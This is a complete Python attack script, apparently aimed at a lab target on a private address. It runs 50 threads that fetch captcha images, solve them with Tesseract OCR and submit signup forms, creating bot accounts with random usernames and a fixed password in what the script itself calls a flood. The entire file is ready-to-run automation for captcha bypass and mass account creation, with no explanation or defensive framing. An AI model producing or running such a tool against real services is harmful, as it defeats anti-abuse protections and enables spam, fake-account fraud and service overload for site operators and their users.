import requests
import random
import string
import threading
import time
import urllib3
import io
import shutil
import sys

# --- IMPORT DEPENDENCIES SAFELY ---
try:
    import pytesseract
    from PIL import Image
except ImportError:
    print("[-] ERROR: Missing Python libraries.")
    print("    Run: pip install pytesseract pillow")
    sys.exit(1)

# --- CONFIGURATION ---
TARGET_URL = "https://10.10.10.3/signup"
CAPTCHA_URL = "https://10.10.10.3/captcha/image"
HOST_HEADER = "web.sun.dmz"
THREAD_COUNT = 50

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_system_dependencies():
    """Verifies that the Tesseract binary is installed on the OS."""
    if shutil.which('tesseract') is None:
        print("[-] FATAL ERROR: 'tesseract' binary not found in PATH.")
        print("    The Python library is installed, but the OCR engine is missing.")
        print("    -> Alpine: apk add tesseract-ocr")
        print("    -> Debian: apt install tesseract-ocr")
        sys.exit(1)
    print("[+] System check: Tesseract OCR binary found.")

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def attack_worker(thread_id):
    # Create session per thread
    session = requests.Session()
    session.verify = False
    # Manually set the Host header to pass the server's routing checks
    session.headers.update({"Host": HOST_HEADER})

    # Debug print to prove thread is running
    # print(f"[*] Thread {thread_id} started.")

    while True:
        try:
            # 1. Download the Image
            # We explicitly handle the request to ensure traffic is generated
            try:
                r_img = session.get(CAPTCHA_URL, timeout=5)
                if r_img.status_code != 200:
                    print(f"[-] Thread {thread_id}: Failed to get image (Status {r_img.status_code})")
                    time.sleep(1)
                    continue
            except Exception as e:
                # If we fail here, the server is down or unreachable
                print(f"[-] Thread {thread_id}: Connection Error: {e}")
                time.sleep(5)
                continue

            # 2. Solve with OCR
            try:
                img = Image.open(io.BytesIO(r_img.content))
                # Convert to grayscale (L) for better OCR accuracy
                img = img.convert('L') 
                
                # Perform OCR
                # --psm 8 treats the image as a single word (good for captchas)
                captcha_guess = pytesseract.image_to_string(img, config='--psm 8').strip()
                
                # Filter non-alphanumeric characters
                captcha_guess = ''.join(filter(str.isalnum, captcha_guess)).upper()
            except Exception as e:
                print(f"[-] Thread {thread_id}: OCR Error: {e}")
                continue

            # If OCR failed to find text, skip
            if not captcha_guess:
                continue

            # 3. Submit the Signup
            username = f"bot_{generate_random_string(8)}"
            password = "Password123!"

            r_post = session.post(TARGET_URL, data={
                "username": username,
                "password": password,
                "captcha_answer": captcha_guess
            }, timeout=5)

            # 4. Check Result
            if r_post.status_code == 302 or "dashboard" in r_post.text:
                print(f"[+] SUCCESS: Solved '{captcha_guess}' -> Created {username}")
            
            # Optional: Uncomment to see failed attempts (it will be spammy)
            # else:
            #    print(f"[-] Failed: '{captcha_guess}'")

        except Exception as e:
            print(f"[!] Critical Thread Error: {e}")
            time.sleep(1)

def start_attack():
    # 1. Check if Tesseract is installed
    check_system_dependencies()
    
    print(f"--- Starting OCR-Based Flood on {TARGET_URL} ---")
    print(f"--- Threads: {THREAD_COUNT} ---")

    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker, args=(i,))
        t.daemon = True 
        t.start()
        threads.append(t)
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")

if __name__ == "__main__":
    start_attack()